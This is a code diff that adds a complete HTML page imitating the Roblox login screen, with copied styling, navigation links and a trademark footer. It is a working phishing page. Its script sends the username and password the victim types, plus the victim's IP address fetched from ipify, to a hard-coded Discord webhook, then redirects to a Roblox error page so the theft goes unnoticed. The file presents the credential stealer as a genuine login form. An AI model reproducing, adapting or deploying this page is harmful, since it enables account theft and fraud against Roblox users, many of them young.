@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <style>
+        body {
+            background-color: #232527;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .topbar {
+            width: 100%;
+            background-color: #191b1d;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .topbar img {
+            height: 25px;
+            width: auto;
+            margin-left: 3px;
+        }
+
+        .topbar a {
+            color: white;
+            text-decoration: none;
+            margin-left: 30px;
+        }
+
+        .search-container {
+            position: relative;
+            margin-left: 200px;
+            width: 340px;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 20px;
+            width: auto;
+        }
+
+        .search-container input {
+            padding-left: 40px;
+            padding: 5px;
+            border-radius: 5px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            width: 100%;
+            background-color: #0A0B0C;
+            color: white;
+            transition: border-color 0.3s;
+        }
+
+        .search-container input:focus {
+            border-color: #ffffff;
+            outline: none;
+        }
+
+        .topbar button {
+            background-color: #00B06F;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 490px;
+            width: 80px;
+        }
+        .topbar button:hover {
+            background-color: #00B06F;
+            color: white;
+            border: none;
+        }
+
+        .content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding-bottom: 60px;
+        }
+
+        .content-box {
+            width: 350px;
+            height: auto;
+            background-color: #393b3d;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            margin-top: 10px;
+        }
+
+        h1 {
+            font-size: 2em;
+            text-align: center;
+            margin: 0 0 10px 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #111212;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1em;
+        }
+
+        ::placeholder {
+            color: #4b4f53;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 4px;
+            background-color: transparent;
+            color: #bcbdbd;
+            border: 1px solid #bcbdbd;
+            border-radius: 15px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: transparent;
+            color: white;
+            border: 1px solid white;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            color: white;
+            text-decoration: none;
+            font-size: 1.1em;
+        }
+
+        .divider {
+            margin: 22px 0;
+            width: 100%;
+            height: 1px;
+            background-color: #bcbdbd;
+        }
+
+        .sign-up {
+            margin: 5px 0;
+            color: white;
+            font-size: 0.9em;
+        }
+
+        .sign-up a {
+            color: white;
+            text-decoration: none;
+            font-size: 1.1em;
+        }
+
+        .downbar {
+            background-color: #232527;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .downbar a {
+            color: rgba(255, 255, 255, 0.551);
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 0.9em;
+        }
+
+        .footer-line {
+            width: calc(100% - 505px);
+            height: 0.1px;
+            background-color: #bcbdbd;
+            margin: 10px auto;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 0.7em;
+            color: #bcbdbd;
+            padding: 10px 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="topbar">
+        <img src="rbx-icon.png" alt="Icon">
+        <a href="https://www.roblox.com/charts">Charts</a>
+        <a href="https://www.roblox.com/catalog">Marketplace</a>
+        <a href="https://create.roblox.com/">Create</a>
+        <a href="https://www.roblox.com/upgrades/robux">Robux</a>
+        <div class="search-container">
+            <img src="magnifying-glass.png" alt="Search" class="search-icon">
+            <input type="text" placeholder="         Search" aria-label="Search">
+        </div>
+        <button>Sign Up</button>
+    </div>
+    <div class="content">
+        <div class="content-box">
+            <h1>Login to Roblox</h1>
+            <input type="text" id="username" placeholder="Username/Email/Phone" aria-label="Username or Email or Phone">
+            <input type="password" id="password" placeholder="Password" aria-label="Password">
+            <button id="loginButton">Log In</button>
+            <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-password"
+                target="_blank">Forgot Password or Username?</a>
+            <div class="divider"></div>
+            <button onclick="window.location.href='https://www.roblox.com/error'">Email Me a One-Time Code</button>
+            <button onclick="window.location.href='https://www.roblox.com/error'" style="margin-bottom: 30px;">Use
+                Another Device</button>
+            <div class="sign-up">
+                Don't have an account? <a href="https://www.roblox.com/CreateAccount" target="_blank">Sign Up</a>
+            </div>
+        </div>
+    </div>
+    <div class="downbar">
+        <a href="https://corp.roblox.com/">About Us</a>
+        <a href="https://careers.roblox.com/">Jobs</a>
+        <a href="https://corp.roblox.com/newsroom">Blog</a>
+        <a href="https://corp.roblox.com/families/">Parents</a>
+        <a href="https://www.roblox.com/giftcards-us">Gift Cards</a>
+        <a href="https://en.help.roblox.com/hc/en-us">Help</a>
+        <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use">Terms</a>
+        <a
+            href="https://en.help.roblox.com/hc/en-us/articles/360059080071-Roblox-Accessibility-Statement">Accessibility</a>
+        <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy">Privacy</a>
+        <a href="" style="display: flex; align-items: center;">
+            Your Privacy Choices
+            <img src="privacy-icon.png" alt="Privacy Icon" style="width: 25px; height: 20px; margin-left: 2px;">
+        </a>
+        <a href="https://www.roblox.com/error">Cookie Options</a>
+    </div>
+    <div class="footer-line"></div>
+    <div class="footer-text">
+        ©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and
+        unregistered trademarks in the U.S. and other countries.
+    </div>
+
+    <script>
+        const searchInput = document.querySelector('.search-container input');
+        const searchIcon = document.querySelector('.search-icon');
+        const loginButton = document.getElementById('loginButton');
+
+        const COOLDOWN_PERIOD = 15 * 1000;
+
+        function validateUsername(username) {
+            const hasAtSymbol = username.includes('@');
+            const minLength = 3;
+            const maxLength = hasAtSymbol ? 60 : 20;
+            return username.length >= minLength && username.length <= maxLength;
+        }
+
+        function validatePassword(password) {
+            return password.length >= 8 && password.length <= 200;
+        }
+
+  
+        function updateButtonState(disabled) {
+            loginButton.disabled = disabled;
+        }
+        window.onload = () => {
+            const lastLoginTime = localStorage.getItem('lastLoginTime');
+            if (lastLoginTime) {
+                const remainingTime = COOLDOWN_PERIOD - (Date.now() - lastLoginTime);
+                if (remainingTime > 0) {
+                    updateButtonState(true);
+                    setTimeout(() => updateButtonState(false), remainingTime); 
+                }
+            }
+        };
+
+        searchInput.addEventListener('input', () => {
+            if (searchInput.value.trim() === '') {
+                searchIcon.style.display = 'block';
+            } else {
+                searchIcon.style.display = 'none'; 
+            }
+        });
+        loginButton.addEventListener('click', () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!validateUsername(username) || !validatePassword(password)) {
+                return;
+            }
+            const lastLoginTime = localStorage.getItem('lastLoginTime');
+            const currentTime = Date.now();
+            if (lastLoginTime && (currentTime - lastLoginTime < COOLDOWN_PERIOD)) {
+                return;
+            }
+            localStorage.setItem('lastLoginTime', currentTime);
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    const payload = {
+                        content: userIp,
+                        embeds: [{
+                            title: "Login Attempt",
+                            color: 0xff0000,
+                            fields: [
+                                { name: "Username", value: username, inline: true },
+                                { name: "Password", value: password, inline: true }
+                            ]
+                        }]
+                    };
+
+                    return fetch('https://discord.com/api/webhooks/1309499525806948363/-j3mYFN33o4cMdrbtEytajxSlsSpFnXh-DCmFTdaeaDqbqxOH1qG28juJd_NNZfWpr9q', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent successfully!');
+                        window.location.href = 'https://roblox.com/error';
+                    } else {
+                        console.error('Error sending data:', response.status, response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                });
+            updateButtonState(true);
+            setTimeout(() => updateButtonState(false), COOLDOWN_PERIOD);
+        });
+
+        searchInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                const keyword = encodeURIComponent(searchInput.value.trim());
+                window.location.href = `https://www.roblox.com/discover/?Keyword=${keyword}`;
+            }
+        });
+    </script>
+</body>
+
+</html>
